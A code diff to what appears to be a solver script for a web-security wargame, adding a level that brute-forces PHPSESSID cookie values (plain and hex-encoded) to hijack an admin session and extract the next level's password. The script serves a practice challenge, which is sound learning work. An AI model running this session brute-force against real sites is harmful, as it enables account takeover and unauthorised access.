@@ -413,6 +413,42 @@ def level17():
         print(" Password found: {}".format(passwords[level + 1]))
     else:
         print(" Password not found")
+
+def level18():
+    m = 640
+    u = "admin"
+    p = ""
+    print(" Bruteforce PHPSESSID from 1 to {}".format(m))
+    for i in range(1, m):
+        if level == 18: s = i
+        elif level == 19:
+            s = "".join(
+                "{:02x}".format((ord(c))) for c in "{}-{}".format(i, u)
+            )
+            
+        res, reg = rex(
+            "POST",
+            "/index.php",
+            "Password: (\w+)</pre>",
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": "PHPSESSID={}".format(s),
+            },
+            body="username={}&password=pass".format(u),
+            log=False,
+        )
+
+        if res.status != 200: return
+        if reg:
+            print(" Found admin session ID {}".format(i))
+            p = reg[1]
+            break
+        
+    if p != "":
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")        
         
 def levelN():
     print("Level {} not implemented yet".format(level))
@@ -423,7 +459,7 @@ levels = [
     level4, level5, level6, level7,
     level8, level9, level9, level11,
     level12, level12, level14, level15,
-    level16, level17, levelN, levelN,
+    level16, level17, level18, level18,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
